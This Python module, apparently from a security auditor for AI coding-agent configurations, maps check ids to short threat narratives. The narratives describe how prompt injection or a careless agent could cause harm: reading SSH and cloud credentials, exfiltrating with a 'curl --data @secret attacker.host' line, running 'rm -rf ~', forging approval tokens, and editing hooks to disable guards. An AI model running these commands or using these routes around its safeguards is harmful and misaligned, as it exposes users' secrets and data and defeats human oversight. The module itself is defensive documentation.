"""Threat narratives keyed by stable check id — the "why this matters" layer.

This is the explanatory companion to each check's actionable ``remediation``: where
``remediation`` says *what to do*, the failure mode says *what goes wrong if you don't* —
the concrete, documented red-team incident the check guards against. It lives in code (not
``docs/rubric.md`` or ``examples/redteam/``, neither of which ships in the wheel) so the
``explain`` command can surface it from an installed package.

Keyed by check id because ids are the rubric's stable contract (never reused). A meta-test
asserts this registry covers exactly the registered checks, so a new check can't ship without
a narrative and a retired id can't leave a dangling entry.
"""

from __future__ import annotations

FAILURE_MODES: dict[str, str] = {
    # D1 — Secret protection & credential isolation
    "HS-D1-01": (
        "An injected instruction or a careless agent reads ~/.ssh/id_rsa, ~/.aws/credentials, "
        "or a project .env and exfiltrates it. The Read tool opens any path the OS permits; "
        "permissions.deny is the only floor."
    ),
    "HS-D1-02": (
        "Deny globs cover the Read tool, but Bash is a parallel read path: `cat ~/.ssh/id_rsa` "
        "slips past a Read-only deny unless a PreToolUse Bash hook re-blocks sensitive reads."
    ),
    "HS-D1-03": (
        "An API key gets written into a file and committed, because nothing scans writes or "
        "commits for secrets at the moment they happen."
    ),
    "HS-D1-04": (
        "The harness's own approval-token / state store is readable, so the agent can read it "
        "to forge an approval token and self-authorize a gated action."
    ),
    "HS-D1-05": (
        "Telemetry and error-reporting payloads ship code, paths, or prompts off-box — an "
        "exception report becomes an exfiltration channel."
    ),
    "HS-D1-06": (
        "Browser-extension crypto-wallet keystores (MetaMask, Phantom) are readable, so a wallet "
        "seed can be lifted straight off disk."
    ),
    # D2 — Egress / exfiltration control
    "HS-D2-01": (
        "The agent (or an injection) runs `curl --data @secret attacker.host` and exfiltrates "
        "over a normal-looking Bash command, with no egress inspection on the Bash lane."
    ),
    "HS-D2-02": (
        "A single MCP call bulk-dumps every resource a server exposes, because "
        "ListMcpResourcesTool / ReadMcpResourceTool are not denied."
    ),
    "HS-D2-03": (
        "An oversized MCP payload floods the context window (and any log/exfil channel) because "
        "MAX_MCP_OUTPUT_TOKENS is unbounded."
    ),
    # D3 — Tool-surface & inbound-injection defense
    "HS-D3-01": (
        "MCP tool calls bypass the whole guard stack because the PreToolUse matchers cover only "
        "Bash, not the mcp__.* lane."
    ),
    "HS-D3-02": (
        "Prompt injection rides in on fetched web text, an MCP result, or a file read, because "
        "no PostToolUse sentinel screens inbound content on those three vectors."
    ),
    "HS-D3-03": (
        "A guard registered on Bash alone leaves the Read/Edit/Write/mcp__.* lanes ungoverned — "
        "a narrow matcher is a hole."
    ),
    # D4 — Destructive-action & git safety
    "HS-D4-01": (
        "A config that declares 'never push to main' only in autoMode.hard_deny does nothing "
        "under bypassPermissions (hard_deny is inert), so the agent or an injection pushes "
        "straight to a protected branch."
    ),
    "HS-D4-02": (
        "`rm -rf ~` or a depth-<=1 home deletion runs unchecked, because no effective-floor "
        "guard blocks catastrophic deletion."
    ),
    "HS-D4-03": (
        "A review/verify subagent opens the live production DB and runs a destructive migration, "
        "because destructive DB ops on non-local hosts are not blocked."
    ),
    "HS-D4-04": (
        "An unvetted (typosquatted or compromised) package is pulled into the tree, because "
        "dependency installs are not gated behind a confirm-token or lockfile freeze."
    ),
    "HS-D4-05": (
        "A force-push drops commits that were ahead on the remote; the policy exists only as "
        "advisory docs, not an enforcing hook."
    ),
    # D5 — Harness self-protection & integrity
    "HS-D5-01": (
        "An injection mutates the guard layer itself — edits a hook, drops a deny rule, blanks "
        "settings.json — and every other guard collapses with it. Closing this needs both "
        "read-path and write-path protection of the config surface."
    ),
    "HS-D5-02": (
        "A hook is silently edited or disabled and nobody notices, because there is no "
        "SessionStart integrity verification (and self-heal) of the guard scripts."
    ),
    "HS-D5-03": (
        "settings.json silently truncates to a bypass-accept stub with no backup, because edits "
        "are not snapshotted before and validated after."
    ),
    # D6 — Verification gates
    "HS-D6-01": (
        "The agent claims 'done' with no evidence, because no TaskCompleted hook runs "
        "compile/tests to verify the claim."
    ),
    "HS-D6-02": (
        "A subagent returns plausible-but-wrong output that is trusted blindly, because there is "
        "no Stop / SubagentStop quality gate."
    ),
    # D7 — Subagent isolation & governance
    "HS-D7-01": (
        "A subagent escapes the enforcement floor, because guards are registered per-agent "
        "instead of globally (top-level Agent/Bash/mcp__.* matchers)."
    ),
    "HS-D7-02": (
        "A CLAUDE_CODE_SUBAGENT_MODEL env pin silently forces every subagent onto one model, "
        "overriding per-task routing."
    ),
    "HS-D7-03": (
        "A builder subagent edits files beyond its declared slice, because there is no PreToolUse "
        "Agent scope linter or SubagentStop reviewer."
    ),
    # D8 — Recovery / rollback safety
    "HS-D8-01": (
        "Context compaction loses un-snapshotted state, because no PreCompact backup hook "
        "captures it first."
    ),
    "HS-D8-02": (
        "An irreversible action is taken inline with no recovery path, because destructive ops "
        "are not deferred for confirmation and worktree isolation is not configured."
    ),
    # D9 — Memory / provenance hygiene
    "HS-D9-01": (
        "A skill pack silently clobbers a user-authored skill, because skill installs are not "
        "gated by a provenance check."
    ),
    "HS-D9-02": (
        "Re-injecting the full skill catalog blows the context budget, because "
        "skillListingBudgetFraction / maxSkillDescriptionChars are unbounded."
    ),
    # D10 — Observability / audit trail
    "HS-D10-01": (
        "You cannot reconstruct what an agent or injection actually did, because Bash and MCP "
        "tool calls are not audit-logged."
    ),
    "HS-D10-02": (
        "Silent failures and denials leave no trail, because there are no PermissionDenied / "
        "PostToolUseFailure / StopFailure log hooks."
    ),
    # --- Codex (CDX-*) -------------------------------------------------------------------------
    # D1 — Secret protection
    "CDX-D1-01": (
        "Every shell command the agent runs inherits your API keys and tokens, because the "
        "default secret-env excludes were disabled (or a secret-named var is explicitly set). A "
        "malicious postinstall reads them straight out of env."
    ),
    "CDX-D1-02": (
        "Codex's sandbox bounds writes but permits reads of ~/.ssh / ~/.aws / ~/.gnupg; without "
        "a credential-read guard hook, those stores are readable."
    ),
    "CDX-D1-03": (
        "With sandbox_mode = danger-full-access an exfiltrated secret (or any output) can be "
        "written anywhere on disk — the write blast-radius is unbounded."
    ),
    # D2 — Egress
    "CDX-D2-01": (
        "`curl --data @secret attacker.host` exfiltrates, because the sandbox is not denying "
        "outbound network (only read-only / workspace-write deny it by default)."
    ),
    "CDX-D2-02": (
        "web_search = live is a live fetch — an ingestion channel for injected instructions and "
        "an egress channel — instead of cached or disabled."
    ),
    "CDX-D2-03": (
        "If the sandbox is misconfigured there is no defense in depth, because egress is not "
        "independently monitored by a hook."
    ),
    # D3 — Tool-surface & injection
    "CDX-D3-01": (
        "The tool surface is ungoverned, because no PreToolUse / PermissionRequest hook "
        "intercepts tool calls before they run."
    ),
    "CDX-D3-02": (
        "Prompt injection arrives via the user prompt or tool output unscreened, because there "
        "is no sanitization hook on UserPromptSubmit / PreToolUse."
    ),
    # D4 — Destructive / git
    "CDX-D4-01": (
        "sandbox_mode = danger-full-access + approval_policy = never with no Bash git hook is "
        "Codex's effective bypass: `rm -rf` and `git push --force` run with nothing in the loop."
    ),
    "CDX-D4-02": (
        "Force-push or destructive shell runs unguarded, because no PreToolUse Bash hook covers "
        "git / destructive commands."
    ),
    "CDX-D4-03": (
        "approval_policy = never removes the human gate entirely; on-failure only prompts after a "
        "command already failed, so the first run is ungated."
    ),
    "CDX-D4-04": (
        "Hundreds of trust_level = trusted directories quietly hollow out the approval floor — "
        "each one suppresses approval prompts inside its tree."
    ),
    # D5 — Self-protection
    "CDX-D5-01": (
        "An injection rewrites the harness's own config / hooks / AGENTS.md, because ~/.codex is "
        "in write scope (danger-full-access, or a writable_roots entry covering it) with no "
        "self-protect hook."
    ),
    "CDX-D5-02": (
        "There is no declared operating contract to anchor behavior, because AGENTS.md is absent."
    ),
    "CDX-D5-03": (
        "Nothing blocks writes to ~/.codex config beyond the sandbox default, because there is no "
        "dedicated self-protection hook."
    ),
    # D6 — Verification
    "CDX-D6-01": (
        "The agent claims completion with no verification, because there is no Stop verification "
        "hook."
    ),
    "CDX-D6-02": (
        "Completion claims are trusted without an independent check, because no QA / closeout / "
        "review agent role verifies them."
    ),
    # D7 — Subagent governance
    "CDX-D7-01": (
        "Subagent fan-out is unbounded (max_threads / max_depth unset), so a runaway delegation "
        "tree can spawn without limit."
    ),
    "CDX-D7-02": (
        "A subagent role runs approval_policy = never, bypassing the human gate for everything it "
        "does even when the top-level policy is stricter."
    ),
    # D8 — Recovery
    "CDX-D8-01": (
        "Changes are not confined for rollback, because sandbox_mode = danger-full-access lets "
        "the agent write irreversibly outside the workspace."
    ),
    "CDX-D8-02": (
        "There is no session-start checkpoint hook to anchor a recovery point at the start of a "
        "turn."
    ),
    # D9 — Provenance
    "CDX-D9-01": (
        "Subagent roles are not provenance-tracked, because not every [agents.*] role declares a "
        "config_file pinning its definition."
    ),
    "CDX-D9-02": (
        "Session history is not persisted, so there is no record of what happened across turns "
        "for audit or recovery."
    ),
    # D10 — Observability
    "CDX-D10-01": (
        "Tool calls are not audit-logged, so an agent's or injection's actions cannot be "
        "reconstructed after the fact."
    ),
    "CDX-D10-02": (
        "Turn completion is unobservable, because neither notify nor a Stop hook signals when a "
        "turn ends."
    ),
}
